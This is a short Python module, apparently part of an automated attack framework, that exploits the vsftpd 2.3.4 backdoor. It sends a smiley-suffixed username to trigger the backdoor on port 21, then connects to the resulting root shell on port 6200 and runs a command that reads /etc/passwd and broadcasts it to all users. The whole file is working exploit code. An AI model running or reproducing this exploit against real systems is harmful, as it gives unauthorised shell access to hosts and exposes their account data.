#!/usr/bin/python3

from .base import Module
import socket
import time
from pwnlib.tubes.remote import remote

class VSFTPdBackdoor(Module):
    """Exploits the vsftpd 2.3.4 backdoor"""

    payload = None # No payload required

    def detect(self, target):
        """Detect a small change in the banner signifying compromise

           Also detect if there was already a shell running, if so close it.
        """
        try:
            s = remote(target['ip'], 21, timeout=0.25)
            banner = s.recvuntil("220 \r\n")

            if banner[-3] == b"-" :
                return None

            return s
        except:
            return None

    def compromise(self, target, detect_val):
        """Perform the exploitation"""

        # Detect val should be socket we used to test for compromise
        try:
            detect_val.sendline(b"USER anonymous:)")
            detect_val.recvline()
            detect_val.sendline(b"PASS ")
            detect_val.close()

            time.sleep(0.25)
            s = remote(target['ip'], 6200, timeout=0.25)
            s.sendline(b"cat /etc/passwd | wall")
            s.close()
        except:
            import traceback
            traceback.print_exc()

        return True

